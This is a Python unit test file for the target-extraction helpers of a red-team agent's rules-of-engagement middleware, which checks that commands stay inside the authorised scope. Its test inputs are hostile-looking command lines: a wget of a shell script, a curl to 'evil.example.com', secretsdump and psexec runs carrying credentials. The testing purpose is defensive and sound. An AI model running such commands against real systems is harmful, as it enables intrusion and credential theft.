"""Unit tests for ``decepticon.middleware._command_targets``.

This module extracts the host/IP/CIDR targets out of a red-team command so
the RoE middleware can decide whether the command stays inside the
authorised scope. Two failure modes both matter:

* a **false negative** (a real target not extracted) lets an out-of-scope
  command through RoE ENFORCE;
* a **false positive** (a local file / option value mistaken for a target)
  makes RoE wrongly refuse a legitimate command.

Both are exercised here, with explicit cases for the file-argument
exclusions (``-oA out.txt`` / ``-i key.pem``) that previously caused
spurious blocks. Pure-logic only; no network / docker / LLM.
"""

from __future__ import annotations

from decepticon.middleware._command_targets import (
    _extract_generic,
    _extract_impacket_targets,
    _extract_nmap_targets,
    _extract_ssh_targets,
    _is_valid_target,
    _looks_ipv6,
    extract_targets,
)

# ---------------------------------------------------------------- _is_valid_target


def test_valid_ip_cidr_and_hostname_are_targets():
    assert _is_valid_target("10.0.0.5") is True
    assert _is_valid_target("10.0.0.0/24") is True
    assert _is_valid_target("dc01.corp.local") is True
    assert _is_valid_target("example.com") is True


def test_length_bounds_rejected():
    assert _is_valid_target("") is False
    assert _is_valid_target("ab") is False  # < 3
    assert _is_valid_target("a" * 254) is False  # > 253


def test_option_flags_and_paths_rejected():
    assert _is_valid_target("-oA") is False
    assert _is_valid_target("--script") is False
    assert _is_valid_target("/etc/passwd") is False


def test_bare_word_without_dot_rejected():
    # 'localhost' has no dot and is not an IP literal -> not a routable target.
    assert _is_valid_target("localhost") is False


def test_local_file_arguments_excluded():
    # The whole point of _NON_TARGET_EXTENSIONS: option values that look
    # hostname-shaped must not be treated as network targets.
    assert _is_valid_target("scan.txt") is False
    assert _is_valid_target("key.pem") is False


def test_invalid_characters_rejected():
    assert _is_valid_target("foo bar.com") is False  # space
    assert _is_valid_target("ev!l.com") is False


# ---------------------------------------------------------------- _extract_generic


def test_generic_extracts_ip_cidr_and_url_host():
    assert _extract_generic("wget http://10.0.0.7/shell.sh") == {"10.0.0.7"}
    assert "192.168.1.0/24" in _extract_generic("scanning 192.168.1.0/24 now")
    # set equality (not `host in url`) so CodeQL's URL-substring heuristic
    # doesn't false-positive on this membership assertion.
    assert _extract_generic("curl https://evil.example.com/x") == {"evil.example.com"}


def test_generic_ignores_pure_local_commands():
    assert _extract_generic("ls -la /tmp/output.txt") == set()


# ---------------------------------------------------------------- nmap


def test_nmap_extracts_target_not_output_file():
    targets = _extract_nmap_targets("nmap -sV -oA out.txt 10.0.0.0/24")
    assert "10.0.0.0/24" in targets
    assert "out.txt" not in targets  # -oA value must be skipped


def test_nmap_skips_input_list_file():
    assert _extract_nmap_targets("nmap -iL targets.txt") == set()


def test_nmap_handles_sudo_prefix():
    assert "10.0.0.9" in _extract_nmap_targets("sudo nmap -p- 10.0.0.9")


def test_nmap_unbalanced_quotes_returns_empty():
    assert _extract_nmap_targets('nmap "unterminated 10.0.0.1') == set()


# ---------------------------------------------------------------- ssh


def test_ssh_strips_user_and_port():
    assert _extract_ssh_targets("ssh admin@10.0.0.5") == {"10.0.0.5"}
    assert _extract_ssh_targets("ssh -p 2222 admin@10.0.0.5:22") == {"10.0.0.5"}


def test_ssh_identity_file_not_a_target():
    targets = _extract_ssh_targets("ssh -i key.pem admin@host.corp.local")
    assert "host.corp.local" in targets
    assert "key.pem" not in targets


def test_ssh_only_handles_ssh_family():
    assert _extract_ssh_targets("nmap 10.0.0.1") == set()


# ---------------------------------------------------------------- ipv6 / impacket


def test_looks_ipv6():
    assert _looks_ipv6("fe80::1") is True
    assert _looks_ipv6("::1") is True
    assert _looks_ipv6("10.0.0.1") is False
    assert _looks_ipv6("example.com") is False


def test_impacket_extracts_creds_target():
    targets = _extract_impacket_targets("secretsdump.py corp/admin:pw@dc01.corp.local")
    assert "dc01.corp.local" in targets


def test_impacket_target_with_port():
    targets = _extract_impacket_targets("impacket-psexec corp/admin:pw@10.0.0.9:445")
    assert "10.0.0.9" in targets


# ---------------------------------------------------------------- extract_targets


def test_extract_targets_empty_and_blank():
    assert extract_targets("") == set()
    assert extract_targets("   ") == set()


def test_extract_targets_pure_local_command_has_no_targets():
    assert extract_targets("ls -la /tmp") == set()


def test_extract_targets_nmap_excludes_output_file():
    targets = extract_targets("nmap -sV -oA scan.txt 10.0.0.0/24")
    assert "10.0.0.0/24" in targets
    assert "scan.txt" not in targets


def test_extract_targets_ssh_excludes_identity_file():
    targets = extract_targets("ssh -i ~/keys/id.pem operator@10.0.0.5")
    assert "10.0.0.5" in targets
    assert not any("id.pem" in t for t in targets)


def test_extract_targets_unions_tool_and_generic():
    targets = extract_targets("curl https://api.target.com/v1 && nmap 10.0.0.0/24")
    # superset check rather than `host in targets`: semantically identical for
    # the assertion but avoids CodeQL's incomplete-url-substring false positive.
    assert targets.issuperset({"api.target.com", "10.0.0.0/24"})


def test_extract_targets_fails_soft_on_unbalanced_quotes():
    # nmap's shlex parse raises -> the tool extractor yields nothing, but the
    # generic IP scrape still recovers the target rather than crashing RoE.
    assert "10.0.0.9" in extract_targets('nmap "unterminated 10.0.0.9')


# ---------------------------------------------------------------- soft-fail / skip branches
def test_nmap_ignores_unresolvable_bare_word():
    # 'localhost' has no dot and is not an IP -> the loop skips it, no target.
    assert _extract_nmap_targets("nmap localhost") == set()


def test_ssh_unbalanced_quotes_returns_empty():
    assert _extract_ssh_targets('ssh "unterminated admin@10.0.0.1') == set()


def test_impacket_unbalanced_quotes_returns_empty():
    assert _extract_impacket_targets('secretsdump.py "unterminated admin@10.0.0.1') == set()


def test_impacket_ignores_non_host_after_at():
    # token contains '@' but the right side is a local path, not a host.
    assert _extract_impacket_targets("psexec.py corp/admin:pw@/local/path") == set()
